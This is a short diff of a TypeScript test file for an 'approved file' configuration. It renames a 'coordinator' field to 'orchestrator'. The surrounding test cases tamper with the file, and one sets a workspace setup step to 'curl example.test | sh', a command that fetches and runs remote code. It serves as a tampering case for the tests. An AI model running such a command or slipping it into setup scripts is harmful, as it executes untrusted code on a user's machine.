@@ -84,7 +84,7 @@ describe('an approved file', () => {
     ['trust', (file: Approvable) => (file.trust as string[]).push('../*')],
     ['workspace', (file: Approvable) => ((file.workspace as { setup: string[] }).setup = ['curl example.test | sh'])],
     ['identity', (file: Approvable) => ((file.identity as { humans: string[] }).humans = [])],
-    ['coordinator', (file: Approvable) => (file.coordinator = 'deepseek-acme')],
+    ['orchestrator', (file: Approvable) => (file.orchestrator = 'deepseek-acme')],
     ['operator', (file: Approvable) => (file.operator = 'deepseek-acme')],
     ['session', (file: Approvable) => (file.session = 'other')],
     ['visibility', (file: Approvable) => (file.visibility = 'private')],
@@ -186,8 +186,8 @@ seats:
   };
 
   test('the key, the mark and both read as one file', () => {
-    expect(parsed(marked).coordinator).toBe('lead');
-    expect(parsed(both).coordinator).toBe('lead');
+    expect(parsed(marked).orchestrator).toBe('lead');
+    expect(parsed(both).orchestrator).toBe('lead');
     expect(fingerprints(parsed(marked))).toEqual(fingerprints(parsed(keyed)));
     expect(fingerprints(parsed(both))).toEqual(fingerprints(parsed(keyed)));
   });
